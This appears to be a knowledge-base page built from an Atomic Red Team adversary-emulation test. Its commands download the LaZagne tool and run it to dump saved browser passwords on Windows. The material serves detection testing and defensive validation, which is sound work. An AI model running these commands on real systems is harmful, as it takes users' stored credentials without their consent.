---
atomic_guid: "9a2915b3-3954-4cce-8c76-00fbf4dbd014"
title: "LaZagne - Credentials from Browser"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "9a2915b3-3954-4cce-8c76-00fbf4dbd014"
  - "LaZagne - Credentials from Browser"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# LaZagne - Credentials from Browser

The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.
LaZagne is an open source application used to retrieve passwords stored on a local computer.

## Metadata

- Atomic GUID: 9a2915b3-3954-4cce-8c76-00fbf4dbd014
- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1555.003/T1555.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]

## Input Arguments

### lazagne_path

- description: Path to LaZagne
- type: path
- default: PathToAtomicsFolder\T1555.003\bin\LaZagne.exe

## Dependencies

LaZagne.exe must exist on disk at specified location (#{lazagne_path})

### Prerequisite Check

```powershell
if (Test-Path "#{lazagne_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{lazagne_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "#{lazagne_path}"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
"#{lazagne_path}" browsers
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
